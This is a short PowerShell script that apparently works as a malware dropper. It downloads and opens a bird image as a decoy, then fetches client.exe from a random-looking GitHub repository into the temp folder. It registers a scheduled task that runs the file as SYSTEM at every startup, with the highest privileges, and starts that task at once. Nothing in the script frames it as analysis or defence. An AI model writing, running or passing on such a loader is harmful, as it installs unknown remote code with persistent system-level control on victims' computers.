# Download the image
Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"

# Open the downloaded image
Start-Process "$env:TEMP\blue-bird.jpg"

# Download the client.exe file
$exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
$exePath = "$env:TEMP\client.exe"
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Create a scheduled task to run the client.exe with elevated privileges
$taskName = "RunClientWithElevatedPrivileges"
$action = New-ScheduledTaskAction -Execute $exePath
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings

# Run the scheduled task immediately
Start-ScheduledTask -TaskName $taskName